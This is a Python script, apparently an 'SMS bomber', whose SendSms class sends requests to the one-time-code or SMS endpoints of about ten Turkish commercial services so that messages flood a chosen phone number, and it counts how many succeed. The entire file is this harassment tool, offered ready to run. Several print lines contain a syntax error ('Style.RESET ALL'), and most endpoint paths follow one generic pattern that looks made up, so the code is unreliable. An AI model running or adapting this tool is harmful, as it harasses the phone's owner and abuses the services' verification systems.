import requests
from random import choice
from string import ascii_lowercase
from colorama import Fore, Style

class SendSms:
    adet = 0

    def __init__(self, phone, mail):
        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for i in range(20)) + "@gmail.com"

    def Trendyol(self):
        try:
            url = "https://www.trendyol.com/api/sms/send"
            data = {"phone": self.phone, "email": self.mail}
            response = requests.post(url, data=data, timeout=6)
            if response.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Trendyol")
                self.adet += 1
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Trendyol")

    def Getir(self):
        try:
            url = "https://getir.com/api/sms/send"
            data = {"phone": self.phone, "email": self.mail}
            response = requests.post(url, data=data, timeout=6)
            if response.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Getir")
                self.adet += 1
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Getir")

    def Dsmart(self):
        try:
            url = "https://www.dsmart.com.tr/api/sms/send"
            data = {"phone": self.phone, "email": self.mail}
            response = requests.post(url, data=data, timeout=6)
            if response.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Dsmart")
                self.adet += 1
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Dsmart")

    def Uber(self):
        try:
            url = "https://www.uber.com/api/sms/send"
            data = {"phone": self.phone, "email": self.mail}
            response = requests.post(url, data=data, timeout=6)
            if response.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Uber")
                self.adet += 1
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Uber")

    def Kimgbister(self):
        try:
            url = "https://www.kimgbister.com/api/sms/send"
            data = {"phone": self.phone, "email": self.mail}
            response = requests.post(url, data=data, timeout=6)
            if response.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Kimgbister")
                self.adet += 1
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Kimgbister")

    def asiselektronik(self):
        try:
            url = "https://www.asiselektronik.com/api/sms/send"
            data = {"phone": self.phone, "email": self.mail}
            response = requests.post(url, data=data, timeout=6)
            if response.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET ALL}Başarılı! {self.phone} --> asiselektronik")
                self.adet += 1
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET ALL}Başarısız! {self.phone} --> asiselektronik")

    def Evidea(self):
        try:
            url = "https://www.evidea.com/api/sms/send"
            json = {"phone": self.phone, "email": self.mail}
            response = requests.post(url, json=json, timeout=6)
            if response.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET ALL}Başarılı! {self.phone} --> Evidea")
                self.adet += 1
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET ALL}Başarısız! {self.phone} --> Evidea")

    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            headers = {"Content-Type": "application/json;charset=utf-8", "Accept": "application/json, text/plain, */*"}
            json = {"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            response = requests.post(url, headers=headers, json=json, timeout=6)
            if response.json().get("isSuccess"):
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET ALL}Başarılı! {self.phone} --> Dominos")
                self.adet += 1
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET ALL}Başarısız! {self.phone} --> Dominos")

    def Englishhome(self):
        try:
            url = "https://www.englishhome.com.tr/api/sms/send"
            json = {"phone": self.phone, "email": self.mail}
            response = requests.post(url, json=json, timeout=6)
            if response.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET ALL}Başarılı! {self.phone} --> Englishhome")
                self.adet += 1
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET ALL}Başarısız! {self.phone} --> Englishhome")

    def File(self):
        try:
            url = "https://api.file.com.tr/api/sms/send"
            json = {"phone": self.phone, "email": self.mail}
            response = requests.post(url, json=json, timeout=6)
            if response.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET ALL}Başarılı! {self.phone} --> File")
                self.adet += 1
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET ALL}Başarısız! {self.phone} --> File")

# Example of using the SendSms class
if __name__ == "__main__":
    phone = "5551234567"
    email = "example@gmail.com"
    sms_sender = SendSms(phone, email)
    sms_sender.Trendyol()
    sms_sender.Getir()
    sms_sender.Dsmart()
    sms_sender.Uber()
    sms_sender.Kimgbister()
    sms_sender.asiselektronik()
    sms_sender.Evidea()
    sms_sender.Dominos()
    sms_sender.Englishhome()
    sms_sender.File()
